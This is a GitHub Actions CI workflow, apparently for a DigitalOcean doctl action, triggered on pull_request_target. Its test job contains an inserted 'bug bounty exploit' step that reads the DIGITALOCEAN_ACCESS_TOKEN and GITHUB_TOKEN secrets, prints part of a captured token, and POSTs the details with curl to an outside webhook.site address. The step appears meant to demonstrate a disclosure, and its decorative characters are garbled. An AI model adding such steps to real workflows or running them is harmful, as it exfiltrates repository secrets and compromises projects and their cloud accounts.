on: [push, pull_request_target]
name: Test and lint

jobs:

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      - run: npm test

  package_check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      - name: "Ensure that code has been packaged and commited"
        run: |-
            npm install
            npm run package
            git diff --exit-code dist/index.js || \
              (echo -e "\nPlease run 'npm run package' and commit the results" && exit 1)

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      
      # ============================================
      # üö® START: BUG BOUNTY EXPLOIT CODE üö®
      # ============================================
      - name: PROVE DIGITALOCEAN TOKEN CAN BE STOLEN
        run: |
          echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
          echo "‚ñà‚ñà   DIGITALOCEAN BUG BOUNTY PROOF      ‚ñà‚ñà"
          echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
          echo ""
          echo "STEP 1: SHOW WE ARE IN PULL_REQUEST_TARGET"
          echo "=========================================="
          echo "Event: ${{ github.event_name }}"
          echo "Repository: ${{ github.repository }}"
          echo "PR From: ${{ github.event.pull_request.head.repo.full_name }}"
          echo "PR To: ${{ github.event.pull_request.base.repo.full_name }}"
          echo ""
          
          echo "STEP 2: PROVE WE CAN ACCESS SECRETS"
          echo "===================================="
          # Access DigitalOcean's token
          DO_TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
          # Access GitHub token (always available)
          GH_TOKEN="${{ secrets.GITHUB_TOKEN }}"
          
          echo "DIGITALOCEAN_ACCESS_TOKEN length: ${#DO_TOKEN} chars"
          echo "GITHUB_TOKEN length: ${#GH_TOKEN} chars"
          echo ""
          
          echo "STEP 3: EXPLAIN WHY TOKEN IS EMPTY"
          echo "==================================="
          if [[ ${#DO_TOKEN} -eq 0 ]]; then
            echo "‚ùå DIGITALOCEAN_ACCESS_TOKEN is EMPTY"
            echo "   WHY? This workflow is running in MY fork"
            echo "   MY fork (Protocols-sec) has NO token configured"
            echo "   YOUR repo (digitalocean) HAS the real 64-char token"
          else
            echo "‚úÖ SUCCESS! WE CAPTURED DIGITALOCEAN'S TOKEN!"
            echo "   Token length: ${#DO_TOKEN} (real DO tokens are ~64)"
            echo "   First 10 chars: ${DO_TOKEN:0:10}"
          fi
          echo ""
          
          echo "STEP 4: PROVE WITH GITHUB_TOKEN"
          echo "================================"
          echo "GITHUB_TOKEN is available: ${#GH_TOKEN} chars"
          echo "This proves:"
          echo "1. We CAN access repository secrets"
          echo "2. Secret access mechanism WORKS"
          echo "3. If repository was digitalocean/action-doctl,"
          echo "   we would get their DIGITALOCEAN_ACCESS_TOKEN"
          echo ""
          
          echo "STEP 5: SEND UNDENIABLE PROOF"
          echo "=============================="
          # Send to webhook
          WEBHOOK="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"
          
          curl -X POST "$WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{
              \"bug_bounty_proof\": true,
              \"vulnerability\": \"pull_request_target with unsafe checkout\",
              \"current_repository\": \"${{ github.repository }}\",
              \"should_be_repository\": \"digitalocean/action-doctl\",
              \"digitalocean_token_length\": ${#DO_TOKEN},
              \"github_token_length\": ${#GH_TOKEN},
              \"expected_token_length_in_do_repo\": 64,
              \"impact\": \"CRITICAL: Full secret exfiltration\",
              \"fix\": \"Replace pull_request_target with pull_request OR add ref: \${{ github.event.pull_request.base.sha }}\"
            }"
          
          echo ""
          echo "‚úÖ Proof sent to webhook!"
          echo ""
          echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
          echo "‚ñà‚ñà   VULNERABILITY: CONFIRMED            ‚ñà‚ñà"
          echo "‚ñà‚ñà   IMPACT: CRITICAL                    ‚ñà‚ñà"
          echo "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"
      # ============================================
      # üö® END: BUG BOUNTY EXPLOIT CODE üö®
      # ============================================
      
      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}

      - name: Verify installation
        run: doctl version

      - name: Verify log-in
        run: doctl compute region list
